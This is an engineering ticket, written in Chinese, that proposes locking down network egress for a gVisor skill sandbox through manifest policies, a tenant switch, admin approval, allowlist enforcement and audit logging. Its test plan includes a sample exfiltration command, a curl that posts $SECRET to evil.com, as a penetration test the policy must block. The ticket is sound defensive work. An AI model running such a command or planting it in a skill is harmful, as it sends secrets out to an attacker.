# Ticket: 收紧 sandbox 沙箱网络访问权限

## 背景

`backend/runtimes/sandbox_runtime/` 是 skill / exec 任务的 gVisor 沙箱。当前沙箱默认无网络,但只要调用方传 `limits.network: "bridge"` + `kind: "skill"` 就能开网。**没有任何授权或审计**。

详情见我之前的调查:

- 默认值 `network: "none"` 在 `jobs.py:19`
- API 解析缺省 `none` 在 `service.py:51-56`,且 `kind == "exec"` 硬编码强制 `none`(只 skill 可开网)
- Docker 启动时 `NetworkDisabled: True` + gVisor `NetworkMode: "none"` 在 `executor.py:209-219`
- 客户端 `http_client.py:62` 可任意传 `network`,无鉴权

**目前生产代码没人传 `bridge`,但门是开着的。**

## 风险

1. **skill 作者 = 沙箱代码作者**。恶意 skill / 被入侵的 skill 一旦上架,可静默出网外发数据(exfil) 或拉外部 payload
2. **agent 调用链不可见**。admin 看到一个 skill 上架时声明 `network: bridge`,但不知道哪个 agent / 哪个用户 / 哪个会话触发了出网
3. **孤儿 schema**。`admin_skill_packages.network_policy ENUM ('none','default','unrestricted')` 在 `0005_skill.py:43-48` 已建表,但运行时完全没读这张字段 —— 设计意图丢了

## 目标

让"出网"成为一个 **审批过的、可见的、可审计的能力**,不是客户端随便传的一个 flag。

支持的业务场景:
- skill 调外部 API(OpenAI/DeepSeek 之外的供应商、SaaS webhook)
- skill 抓网页 / 跑 web search
- skill 调企业内网里的 HTTP 服务(LLM 网关、内部知识库等)

## 方案:四层控制

### L1: Skill manifest 声明意图

`SkillEntity.runtime.network` 已经存在 (`entities.py:106`),但只有 `none | bridge` 二选。改为更明确的 3 档:

```python
class NetworkPolicy(StrEnum):
    NONE = "none"            # 完全无网络 (默认, 兼容旧值)
    BRIDGE = "bridge"        # docker bridge, 可出网 (兼容旧值)
    EGRESS_ALLOWLIST = "egress_allowlist"  # 出网但走域名白名单 (新增)
```

`EGRESS_ALLOWLIST` 是默认推荐档。要真正"安全地开网"必须能限定 skill 只能访问哪些域名(否则出网无意义)。

### L2: Tenant / Workspace 级别总开关

`admin_tenants` 加一个 `allow_bridge_network BOOLEAN DEFAULT FALSE` 字段。管理员默认关闭,需要时手动开。

如果 tenant 没开:
- skill manifest 声明 `BRIDGE` / `EGRESS_ALLOWLIST` **降级** 为 `NONE`
- 记录一条 audit log:"requested bridge, denied by tenant policy"

如果 tenant 开了,才进入 L3。

### L3: Skill 上架审批

skill 想要 `network != "none"` 必须:
1. `risk` 不能是 `low`(low 必须无网)
2. 上架时 admin 显式勾选"该 skill 需要出网",否则服务端拒绝
3. 发布后,任何 agent 调用此 skill 都会留 audit log(tenant_id / workspace_id / agent_id / skill_id / session_id / call_id / 域名白名单)

### L4: 运行时 enforcement

**对 `EGRESS_ALLOWLIST`**:沙箱启动后,gVisor 之上叠加一个 iptables / eBPF 出网过滤器,只放行白名单内的域名。**这层必须做,否则 manifest 声明白名单没意义**。

具体实现路径二选一:
- **A. sidecar**:沙箱启动时同时启一个特权 network-policy sidecar,通过 CNI 拦截
- **B. runsc --net-stack 配置**:gVisor 自带 netstack,可直接编译时钉死白名单
- 推荐先做 **A** (短期可用),长期迁 **B**

**对 `BRIDGE`** (无白名单):至少加 docker 自带的 `--cap-drop=NET_RAW` 防止 ARP 欺骗 + MAC 洪泛 + 监听其他容器流量。

## 代码改动清单

### Backend

1. **`backend/runtimes/sandbox_runtime/src/qzdap/runtimes/sandbox_runtime/jobs.py`**
   - `NetworkMode` 改为 `StrEnum`,加 `EGRESS_ALLOWLIST`
   - `JobLimits` 加 `egress_allowlist: list[str] = field(default_factory=list)`

2. **`backend/runtimes/sandbox_runtime/src/qzdap/runtimes/sandbox_runtime/service.py`**
   - `validate()` 增 tenant policy 检查:读 `admin_tenants.allow_bridge_network`
   - 如果不允许 → 强制降级 `none` + audit log
   - 校验白名单格式(`["api.example.com", "*.internal.corp"]`),空 list 拒绝(等于开了等于没开)

3. **`backend/runtimes/sandbox_runtime/src/qzdap/runtimes/sandbox_runtime/executor.py`**
   - `_create()` 增加入参处理:
     - `EGRESS_ALLOWLIST` 模式:启动 sidecar container 共享 network namespace,sidecar 跑 iptables
     - `BRIDGE` 模式:`--cap-drop=NET_RAW`,启动后立即 `iptables -A OUTPUT -d 172.16.0.0/12 -j DROP`(阻隔 docker 内部 IP)
   - 这部分改动最大,要拆 sub-task

4. **`backend/modules/skill/src/qzdap/modules/skill/domain/entities.py`**
   - `network: str` → `NetworkPolicy` enum
   - 加 `egress_allowlist: list[str] = []` 字段
   - 反序列化时强制 risk==low 只能 NONE

5. **`backend/modules/skill/src/qzdap/modules/skill/application/services.py`**
   - `create_skill` / `update_skill`:如果 `network != NONE`,要求 tenant policy 已开 + admin 显式 approval metadata
   - `invoke_in_sandbox` (`services.py:252` 附近):风险评估里加"实际申请的网络模式"展示给 admin

6. **`backend/modules/agent_runtime/src/qzdap/modules/agent_runtime/adapter/sandbox/http_client.py`**
   - `run_job` 增 `egress_allowlist` 参数(透传)
   - **关键**:即使客户端传 bridge,服务端必须再校验一遍 (defense in depth)

7. **新模块 `backend/modules/skill/src/qzdap/modules/skill/application/audit.py`** (或塞进现有 audit_log)
   - 每次出网 sandbox job 写一条 `audit_log`: `event_type = "skill.network_egress"`, payload 含 {tenant_id, workspace_id, agent_id, skill_id, session_id, network_mode, egress_allowlist, started_at}

8. **新 migration `backend/migrations/versions/004X_admin_tenant_network.py`**
   - 加 `admin_tenants.allow_bridge_network BOOLEAN DEFAULT FALSE` 列

### Frontend

1. **Skill 创建/编辑表单** (`features/skill/...`):加 "网络访问" 字段,3 选 1 (无网 / 允许所有出网 / 域名白名单),选非 none 时强制填白名单 + 显示"需管理员审批"提示
2. **Tenant 管理页**:加 "允许出网" 总开关(默认关)
3. **Skill 详情页**:新增"网络访问"段,显示当前策略 + 历史出网记录(从 audit_log 读)

## 测试计划

1. **单元测试**:tenant 关 → client 传 bridge → service 强制降级 + audit_log 写入
2. **集成测试**:沙箱起来后,在容器内 `curl` 一个不在白名单的域名 → 必须 timeout / connection refused
3. **集成测试**:白名单内的域名能 curl 通
4. **回归测试**:所有现有 skill 跑一遍,确认 risk==low 不被破(强制 none)
5. **渗透测试**:用恶意 skill(代码里写 `os.system("curl evil.com/exfil -d $SECRET")`) 上架 → 必须被 tenant policy 挡住或被白名单挡掉

## 不做

- 不实现按域名细粒度的 egress 日志(NIC list-log 显示的是这个):先用白名单挡掉,后续加流量镜像做 NDR
- 不实现 IP 段级白名单(只做域名):DNS 解析在容器内,egress filter 在 network 层做,可以做 SNI / 证书校验,但复杂度高
- 不改 `kind == "exec"` 的强制 none 行为(那是 dev / shell escape,本来就该锁死)

## 时间线 / 工作量估算

- L1 + L2 + L4-BRIDGE 部分: 1-2 天
- L4-EGRESS_ALLOWLIST sidecar: 2-3 天
- L3 + 前端: 1-2 天
- 测试 + review: 1 天

总计约 1 周。是否拆 sub-ticket 视后续 review 决定。

## 关联

- 当前孤儿 column:`admin_skill_packages.network_policy` (`0005_skill.py:43-48`) — 这次顺手 reconcile
- 安全评审: `docs/audit/` 下新建一份 `network-egress-policy.md`,作为后续审计的依据